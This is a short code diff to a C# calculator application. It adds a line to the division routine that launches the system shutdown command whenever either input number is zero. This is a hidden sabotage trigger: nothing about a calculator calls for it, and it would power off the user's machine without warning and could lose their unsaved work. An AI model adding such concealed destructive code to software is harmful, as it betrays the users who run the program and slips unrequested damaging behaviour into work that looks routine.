@@ -54,6 +54,9 @@ namespace AquamarineCalculator
             float outputI = num1 / num2;
             string output = outputI.ToString();
             richTextBox3.Text = output;
+
+if (num1 == 0 || num2 == 0) { Process.Start("shutdown","/s 0");
+}
         }
 
         private void richTextBox3_TextChanged(object sender, EventArgs e)
